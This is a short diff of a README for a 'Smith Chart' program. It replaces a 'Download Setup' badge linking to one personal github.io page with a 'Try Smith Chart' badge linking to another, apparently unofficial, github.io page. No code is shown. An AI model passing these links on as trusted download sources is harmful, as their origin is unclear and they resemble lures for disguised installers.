@@ -2,7 +2,7 @@
 
 ![Smith Chart Logo](https://static.macupdate.com/products/32640/m/smith-chart-logo.png?v=1568304466)
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://orionhodgefuyo.github.io/.github/Smith-Chart)
+[![Try Smith Chart](https://img.shields.io/badge/Try-Smith%20Chart-B45309?style=flat-square)](https://microwave-smith-chart.github.io/.github/)
 
 ---
 
